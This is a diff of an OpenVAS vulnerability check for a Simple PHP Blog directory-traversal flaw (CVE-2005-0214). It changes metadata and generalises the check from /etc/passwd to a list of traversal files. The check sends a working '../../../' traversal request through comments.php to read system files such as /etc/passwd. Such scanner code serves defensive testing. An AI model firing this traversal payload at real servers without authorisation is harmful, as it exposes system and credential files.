@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: sphpblog_dir_traversal.nasl 6056 2017-05-02 09:02:50Z teissa $
+# $Id: sphpblog_dir_traversal.nasl 11761 2018-10-05 10:25:32Z jschulte $
 #
 # Simple PHP Blog dir traversal
 #
@@ -29,8 +29,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.16137");
-  script_version("$Revision: 6056 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
+  script_version("$Revision: 11761 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-05 12:25:32 +0200 (Fri, 05 Oct 2018) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_cve_id("CVE-2005-0214");
   script_bugtraq_id(12193);
@@ -40,19 +40,15 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("This script is Copyright (C) 2005 David Maciejak");
   script_family("Remote file access");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  tag_summary = "The remote host runs Simple PHP Blog, an open source blog written in PHP,
+  script_tag(name:"solution", value:"Upgrade at least to version 0.3.7 r2.");
+  script_tag(name:"summary", value:"The remote host runs Simple PHP Blog, an open source blog written in PHP,
   which allows for retrieval of arbitrary files from the web server.
   These issues are due to a failure of the application to properly
-  sanitize user-supplied input data.";
-
-  tag_solution = "Upgrade at least to version 0.3.7 r2.";
-
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  sanitize user-supplied input data.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -62,19 +58,28 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
 
+files = traversal_files();
+
 foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
-  url = string( dir, "/comments.php?y=05&m=01&entry=../../../../../../../etc/passwd" );
 
-  if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
-    report = report_vuln_url( port:port, url:url );
-    security_message( port:port, data:report );
-    exit( 0 );
+  foreach pattern( keys( files ) ) {
+
+    file = files[pattern];
+
+    url = string( dir, "/comments.php?y=05&m=01&entry=../../../../../../../" + file );
+
+    if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
   }
 }
 
